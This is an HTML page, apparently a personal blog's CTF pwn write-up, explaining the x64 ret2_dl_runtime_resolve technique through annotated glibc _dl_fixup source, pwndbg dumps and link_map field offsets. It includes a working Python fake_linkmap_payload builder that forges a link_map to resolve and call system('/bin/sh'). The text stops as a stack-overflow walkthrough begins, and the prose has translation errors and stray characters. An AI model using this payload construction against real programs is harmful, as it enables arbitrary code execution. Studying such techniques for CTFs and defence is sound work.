@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>ret2_dl_runtime_resolve - Jsjsj</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="ret2_dl_runtime_resolve - Jsjsj" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://jsjsj.top/2023/10/03/ret2-dl-runtime-resolve/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-10-03T14:07:17.000Z" />
+  
+  <meta property="og:article:author" content="Mr. Jsjsj" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+    <body
+        data-color-scheme="dark"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/jsjsj1" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/pwn/">pwn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>October</span>
+            <span>3,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">ret2_dl_runtime_resolve</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="ret2-dl-runtime-resolve-x86-x64"><a href="#ret2-dl-runtime-resolve-x86-x64" class="headerlink" title="ret2_dl_runtime_resolve(x86&#x2F;x64)"></a>ret2_dl_runtime_resolve(x86&#x2F;x64)</h1><h2 id="First-record-the-method-link-map-of-ret2-dl-runtime-resolve-of-x64"><a href="#First-record-the-method-link-map-of-ret2-dl-runtime-resolve-of-x64" class="headerlink" title="First record the method link_map of ret2_dl_runtime_resolve of x64"></a>First record the method link_map of ret2_dl_runtime_resolve of x64</h2><p>I think ret2dl is very difficult, very difficult, really difficult, woo woo<br>link_map I think it is like the iofile on the stack, that is, link_map. Let’s analyze the source code.</p>
+<p>Before analyzing the previous source code, let’s look at a few structures:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Rel：</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">Elf64_Rel：</span><br><span class="line"><span class="keyword">typedef</span> structc</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure>
+
+<p>The above is the relocation function structure,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span>c</span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
+
+<p>The above is the symtable structure, which is precisely located by the r_info of the previous relocation function structure</p>
+<p>In fact, these can be faked in linkmap, let’s look at the structure of linkmap</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *l</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">18446744073708782128</span>,</span><br><span class="line">  l_name = <span class="number">0x0</span>,</span><br><span class="line">  l_ld = <span class="number">0x601168</span>,</span><br><span class="line">  l_next = <span class="number">0x6bcf50</span>,</span><br><span class="line">  l_prev = <span class="number">0x7</span>,</span><br><span class="line">  l_real = <span class="number">0x0</span>,</span><br><span class="line">  l_ns = <span class="number">0</span>,</span><br><span class="line">  l_libname = <span class="number">0x0</span>,</span><br><span class="line">  l_info = &#123;<span class="number">0x601010</span>, <span class="number">0x68732f6e69622f</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x601150</span>, <span class="number">0x601188</span>, <span class="number">0x4141414141414141</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="number">0x601158</span>, <span class="number">0x0</span> &lt;repeats <span class="number">53</span> times&gt;&#125;,</span><br><span class="line">  l_phdr = <span class="number">0x0</span>,</span><br><span class="line">  l_entry = <span class="number">0</span>,</span><br><span class="line">  l_phnum = <span class="number">0</span>,</span><br><span class="line">  l_ldnum = <span class="number">0</span>,</span><br><span class="line">  l_</span><br></pre></td></tr></table></figure>
+
+<p>I read it directly in pwndbg here, because of the structure of the source code, I have seen too little woo woo l_info This place contains<strong>DT_SYMTAB</strong>  <strong>DT_STRTAB</strong>  <strong>DT_JMPREL</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  Get the DT_SYMTAB table of the linkmap</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);   Get the DT_JMPREL table of linkmap reloc relocation structure</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  Get r_info in the relocation structure</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   r_info为<span class="number">7</span>即可绕过</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) sym-&gt;st_other is not <span class="number">0.</span> In fact, this place can fill in a parsed got table. When the writegot table is retrieved, it will be \x7f,. The statement in this <span class="keyword">if</span> is not what we want to play in <span class="number">64</span> bits. These conditions jump directly to the <span class="keyword">else</span> branch</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> r_found_version *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">	    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);   It is found here that as <span class="type">long</span> as you control l-&gt;l_addr and sym-&gt;st_value, you can directly move here, sym-&gt;st_value is written as the function address of one of our libc, and l-&gt;l_addr is covered with a function address that we want to hijack. system-write, why write write here, because the sym-&gt;st_value we hijacked before is the address of the hijacked write function in libc, and it should also be written as libc address here</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">c</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">elf_machine_fixup_plt</span> <span class="params">(l, result, reloc, rel_addr, value)</span>;</span><br><span class="line">&#125;rel_addr就是l-&gt;addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_machine_fixup_plt：</span><br><span class="line">elf_machine_fixup_plt (<span class="keyword">struct</span> link_map *<span class="built_in">map</span>, <span class="type">lookup_t</span> t,</span><br><span class="line">		       <span class="type">const</span> Elf32_Rela *reloc,</span><br><span class="line">		       Elf32_Addr *reloc_addr, Elf32_Addr value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;  We can see that the value overwrites reloc_addr and binds the value of the function. Next, directly when binding jmp r11</span><br><span class="line">&#125;</span><br><span class="line">Automatically bind and jmp r11 to system :</span><br><span class="line">──────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0xee</span></span><br><span class="line"> RBX  <span class="number">0x7ffff85dd3b0</span> —▸ <span class="number">0x400740</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line">*RCX  <span class="number">0x7f8395536fd2</span> (read+<span class="number">18</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br><span class="line"> RDX  <span class="number">0x100</span></span><br><span class="line"> RDI  <span class="number">0x601198</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"> RSI  <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x7f8395643d60</span> (_dl_fini) ◂— endbr64 </span><br><span class="line"> R10  <span class="number">0x601150</span> ◂— <span class="number">0xfffffffffff44230</span></span><br><span class="line"> R11  <span class="number">0x7f839547b290</span> (system) ◂— endbr64 </span><br><span class="line"> R12  <span class="number">0x400550</span> (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7ffff85dd4c0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"> RSP  <span class="number">0x7ffff85dd000</span> ◂— <span class="number">0x100</span></span><br><span class="line">*RIP  <span class="number">0x7f839564ac6b</span> (_dl_runtime_resolve_xsavec+<span class="number">171</span>) ◂— mov    rax, qword ptr [rsp]</span><br><span class="line">────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x7f839564ac52</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">146</span>&gt;    mov    r8, qword ptr [rsp + <span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7f839564ac57</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">151</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x7f839564ac5c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">156</span>&gt;    mov    rsi, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x7f839564ac61</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">161</span>&gt;    mov    rdx, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x7f839564ac66</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">166</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line"> ► <span class="number">0x7f839564ac6b</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;    mov    rax, qword ptr [rsp]</span><br><span class="line">   <span class="number">0x7f839564ac6f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">175</span>&gt;    mov    rsp, rbx</span><br><span class="line">   <span class="number">0x7f839564ac72</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;    mov    rbx, qword ptr [rsp]</span><br><span class="line">   <span class="number">0x7f839564ac76</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;    add    rsp, <span class="number">0x18</span></span><br><span class="line">   <span class="number">0x7f839564ac7a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">186</span>&gt;    bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DT_STRTAB pointer: located in link_map_addr +0x68 (0x34 under 32 bits)</li>
+<li>DT_SYMTAB pointer: located at link_map_addr + 0x70 (0x38 under 32 bits)</li>
+<li>DT_JMPREL pointer: located in link_map_addr +0xF8 (0x7C under 32 bits)</li>
+</ul>
+<p>Another thing to mention is l-&gt;addr, this fill in, this fill must be positive, if it is negative, it will report an error, so here we calculate the offset, if it is a positive sign, we will write it as a positive sign. The master conversion is &amp; (2 ** 64 - 1), we roughly analyze the source code and we know the principle, the following is the construction of the linkmap board</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>-- l_addr offset must be guaranteed to be positive here</span><br><span class="line"><span class="number">2</span>-- DT_JMPREL: make its address point to the location of the constructed .rel.plt relocation table entry</span><br><span class="line"><span class="number">3</span>-- Relocation table entry.rel.plt: make r_info, that is, the index redirected to the symbol table, is <span class="number">0</span></span><br><span class="line"><span class="number">4</span>-- DT_SYMTAB: Make the address pointing to the symbol table write_got<span class="number">-0x8</span>, so that st_value is equal to write_gotc</span><br><span class="line"><span class="number">5</span>-- DT_STRTAB: not used, just point to a readable location</span><br><span class="line">After constructing from the above steps, you can get value = l_addr + write_got = real_system, write the value into the got table entry and successfully call the system function</span><br></pre></td></tr></table></figure>
+
+<p>Since the linkmap is not much different, the board of the online blog is directly used (if there is any infringement, please inform),</p>
+<p>linkmap board:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">    <span class="comment"># &amp;(2**64-1)This is because the offset is usually a negative number. If you do not control the range, the p64 will go out of bounds and an error will occur.</span></span><br><span class="line">    linkmap=p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># 1-- l_addr</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2-- fake_linkmap_addr+0x8:  DT_JMPREL，Its structure refers to the .dynamic section</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x18</span>) <span class="comment"># Fake .rel.plt address</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3-- fake_linkmap_addr+0x18</span></span><br><span class="line">    linkmap+=p64((fake_linkmap_addr+<span class="number">0x30</span>-offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># r_offset: The address on the got table, it is not used, it can be set to a readable and writable address</span></span><br><span class="line">    linkmap+=p64(<span class="number">0x7</span>) <span class="comment"># r_info: 0x7 &gt;&gt; 32 = 0, Corresponding to index 0 of the sym table, the first item</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># r_addend: any value</span></span><br><span class="line"> </span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># l_ns</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 4-- fake_linkmap_addr+0x38: DT_SYMTAB</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(known_func_ptr-<span class="number">0x8</span>) <span class="comment"># Point to the first address of the sym table, indirectly make st_value = known_func_ptr</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_linkmap_addr+0x48</span></span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr) <span class="comment"># Set the address where DT_STRTAB is located</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x38</span>) <span class="comment"># 0x70 Set the address where DT_SYMTAB is located</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0xf8</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x8</span>) <span class="comment">#Set the address where DT_JMPREL is located: any readable area can be</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br></pre></td></tr></table></figure>
+
+<p>Let’s play a stack overflow question directly. The use conditions are harsh, only overflow, and basically nothing else. At this time, we have to consider the ret2dl method.</p>
+<p>The basic steps of stack overflow problem (PARTIAL_RELRO)</p>
+<p>If there is an overflow in the first step, we migrate to a bss place, which is writable (executable), and then jump to the <em>dl_runtime_resolve</em> place, which is on our ida</p>
